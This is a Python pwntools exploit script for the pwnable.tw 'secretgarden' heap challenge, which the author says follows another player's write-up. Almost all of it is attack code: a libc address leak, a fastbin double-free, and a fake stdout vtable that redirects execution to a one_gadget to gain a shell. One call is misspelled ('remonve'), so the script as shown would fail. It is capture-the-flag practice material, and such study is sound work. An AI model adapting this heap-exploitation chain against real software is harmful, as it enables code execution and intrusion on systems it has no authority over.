# this solve method i learn from a write up of "nhiephon" after submiting flag
#!/usr/bin/env python
from pwn import *

__DEBUG__ = 1
#context.log_level = 'debug'
p = None

def init():
        global p
        envs = {'LD_PRELOAD':'libc_64.so.6'}
        if __DEBUG__:
                p = process('./secretgarden')
		raw_input('dbug')
        else:
                p = remote('chall.pwnable.tw', 10203)
        return

def menu():
        """
          1 . Raise a flower
          2 . Visit the garden
          3 . Remove a flower from the garden
          4 . Clean the garden
          5 . Leave the garden"""
        return

def _raise(length, name='', color=''):
        p.sendlineafter('Your choice : ', '1')
        p.sendlineafter('Length of the name :', str(length))
        p.sendafter('The name of flower :', name)
        p.sendlineafter('The color of the flower :', color)
        return

def visit():
        p.sendlineafter('Your choice : ', '2')
        return

def remove(index):
        p.sendlineafter('Your choice : ', '3')
        p.sendlineafter('from the garden:', str(index))
        return

def clean():
        p.sendlineafter('Your choice : ', '4')
        return

if __name__ == '__main__':
        init()
        _raise(0x500, 'A', 'B') #0
        _raise(0x68, 'A', 'B') #1

        #leak_libc
        remove(0)
        _raise(0x68, 'A'*8, 'B') #2
        visit()
        p.recvuntil('AAAAAAAA')
        leak_addr = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00'))
        success('leak_addr : ' + hex(leak_addr))

        libc_base = leak_addr - 0x3c4b78 # server : 0x3c3b78
        one_gadget = libc_base + 0xf1207 # 0xf0567 in server
        _IO21_stdout = libc_base + 0x3c5620 # server : 0x3c4620
        success('libc_base : ' + hex(libc_base))
        success('one_gadget : ' + hex(one_gadget))
        success('_IO21_stdout : ' + hex(_IO21_stdout))

        #overwrite vtable_IO_file_xsputn of _IO_2_1_stdout_
        remove(1)
        remove(2)
        remonve(1)

        #1->2->1 -> _IO_21_stdout
        _raise(0x68, p64(_IO21_stdout + 157), 'B') #4
        _raise(0x68, 'A', 'B') #5
        _raise(0x68, 'A', 'B') #6

        fake_vtable_stdout  = '\x00'*3
        fake_vtable_stdout += p64(0)*2
        fake_vtable_stdout += p64(0xffffffff)
        fake_vtable_stdout += p64(0)
        fake_vtable_stdout += p64(one_gadget)
        fake_vtable_stdout += p64(_IO21_stdout + 152)

        p.sendlineafter('Your choice : ', '1')
        p.sendlineafter('Length of the name :', str(0x68))
        p.sendafter('The name of flower :', fake_vtable_stdout)
        p.interactive()
